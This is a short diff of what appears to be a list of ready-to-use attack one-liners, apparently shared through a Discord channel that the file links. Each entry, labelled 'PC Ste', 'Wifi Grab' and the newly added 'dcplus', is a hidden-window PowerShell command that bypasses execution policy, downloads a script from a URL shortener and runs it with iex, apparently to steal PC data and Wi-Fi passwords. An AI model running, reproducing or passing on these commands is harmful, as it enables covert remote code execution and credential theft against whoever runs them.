@@ -1,5 +1,6 @@
 PC Ste powershell -w h -NoP -Ep Bypass; irm https://rb.gy/sz67pn | iex
 Wifi Grab powershell -w h -NoP -Ep Bypass; irm https://rb.gy/bk5rpv | iex
+dcplus powershell -w h -NoP -Ep Bypass; irm https://rb.gy/40f010 | iex
 
 https://discord.com/channels/749701582052130969/895907015614930984/1268570625702887536
 
